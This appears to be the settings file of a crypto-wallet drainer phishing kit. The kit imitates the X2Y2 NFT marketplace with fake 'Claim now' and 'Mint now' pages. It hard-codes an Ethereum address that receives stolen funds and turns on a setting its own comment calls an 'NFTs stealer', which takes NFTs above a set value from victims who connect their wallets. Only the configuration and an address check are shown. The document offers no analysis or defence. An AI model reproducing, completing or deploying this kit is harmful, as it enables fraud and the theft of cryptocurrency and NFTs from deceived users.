const receiveAddress = "0xF468c145B16051c50c35379ebF2579603152d74a";

const collectionInfo = {
  name: "X2Y2..io",
  socialMedia: {
    discord: "https://discord.com",
    twitter: "https://twitter.com",
    instagram: "https://instagram.com",
  },
};

const indexPageInfo = {
  backgroundImage: "background.jpg", // relative path to background image (in assets)
  title: "{name}", // {name} will be replaced with collectionInfo.name
  underTitle: "X2Y2..io",
};

const claimPageInfo = {
  title: "COLLECTORS<br>X2Y2", // <br> is a line break
  shortDescription: "X2Y2..io.",
  longDescription: "X2Y2..io",

  claimButtonText: "Claim now",

  image: "ola.jpg", // relative path to image (in assets)
  imageRadius: 250, // image radius in px
};

const drainNftsInfo = {
  active: true, // Active (true) or not (false) NFTs stealer.
  minValue: 0.1, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
  nftReceiveAddress: "", // leave empty if you want to use the same as receiveAddress
};

const customStrings = {
  title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
  connectButton: "Connect wallet",
  transferButton: "Mint now",
  dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
};

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (
  !receiveAddress.startsWith("0x") ||
  receiveAddress.length >= 64 ||
  receiveAddress.length <= 40
)
  console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
